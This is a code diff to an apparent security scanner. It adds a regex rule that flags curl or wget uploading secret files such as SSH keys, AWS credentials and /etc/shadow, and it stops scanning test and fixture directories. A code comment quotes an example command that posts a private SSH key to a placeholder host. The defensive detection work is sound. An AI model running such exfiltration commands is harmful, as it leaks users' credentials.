@@ -52,6 +52,12 @@ _RULES: dict[str, list[tuple[str, re.Pattern]]] = {
     "exfiltration": [
         ("discord-webhook", re.compile(r"discord(?:app)?\.com/api/webhooks/", re.I)),
         ("telegram-bot", re.compile(r"api\.telegram\.org/bot", re.I)),
+        # curl/wget POSTING or UPLOADING a secret FILE is credential exfil (the
+        # data is the tell, not the host): `curl -d @~/.ssh/id_rsa http://x`.
+        ("secret-exfil", re.compile(
+            r"\b(?:curl|wget)\b[^\n]*(?:-d|--data(?:-binary)?|-F|--form|-T|--upload-file)"
+            r"[^\n]*(?:id_rsa|id_ed25519|\.ssh/|\.aws/credentials|/etc/shadow|/etc/passwd|"
+            r"\.env\b|credentials?\.(?:json|ya?ml)|secrets?\.(?:json|ya?ml|txt))", re.I)),
         ("curl-post-data",
          re.compile(r"\bcurl\b.*(?:\s-[dFT]\b|--data\b|--upload-file\b)", re.I)),
         ("archive-then-send", re.compile(r"(tar|zip|gzip)\b[^\n]*\|\s*(curl|nc|wget)", re.I)),
@@ -102,22 +108,34 @@ _EMBEDDED_SUFFIXES = {".yml", ".yaml"}  # CI workflows etc.
 _SHEBANG = re.compile(r"^#!.*\b(ba|z|k)?sh\b")
 _MAX_BYTES = 1_000_000
 
-# Vendored / generated trees hold THIRD-PARTY code, not the repo author's work.
-# Scanning them attributes a dependency's (often legitimate) code to the target
-# repo -- the tiledesk false positives came from `node_modules/bytes` and
-# `node_modules/content-disposition`. Exclude them from every scanner so only
-# first-party code can confirm a finding.
+# Paths that are NOT the repo author's executable payload. Two kinds:
+#   * Vendored/generated trees (THIRD-PARTY code) -- the tiledesk FP came from
+#     `node_modules/bytes` and `node_modules/content-disposition`.
+#   * Test / fixture / example trees, which legitimately contain attack strings
+#     as data -- the crewhaus FP came from a prompt-injection DETECTOR whose
+#     `index.test.ts` cites `webhook.site` / telegram as test fixtures.
+# Excluding both means only first-party, shipped code can confirm a finding.
+# (Names are compared case-insensitively.)
 _IGNORE_DIRS = frozenset({
     ".git", "node_modules", "bower_components", "vendor", "third_party",
     "third-party", "dist", "build", "out", ".next", ".nuxt", "target",
-    ".venv", "venv", "virtualenv", "site-packages", "__pycache__", "Pods",
+    ".venv", "venv", "virtualenv", "site-packages", "__pycache__", "pods",
     ".gradle", ".terraform", ".yarn",
+    # non-payload: tests/fixtures/examples carry attack strings as DATA
+    "test", "tests", "__tests__", "spec", "__spec__", "fixtures", "fixture",
+    "__fixtures__", "mocks", "__mocks__", "e2e", "testdata", "examples", "example",
 })
+# Test-file name markers (a test file can live anywhere, e.g. `src/x.test.ts`).
+_TEST_FILE_MARKERS = (".test.", ".spec.", ".stories.", ".fixture.", ".mock.")
 
 
 def is_ignored_path(path: Path) -> bool:
-    """True if a path lives under a vendored/generated dir (skip for scanning)."""
-    return bool(_IGNORE_DIRS.intersection(path.parts))
+    """True if a path is vendored/generated or a test/fixture (skip for scanning)."""
+    parts = {p.lower() for p in path.parts}
+    if _IGNORE_DIRS & parts:
+        return True
+    name = path.name.lower()
+    return any(marker in name for marker in _TEST_FILE_MARKERS)
 
 
 @dataclass
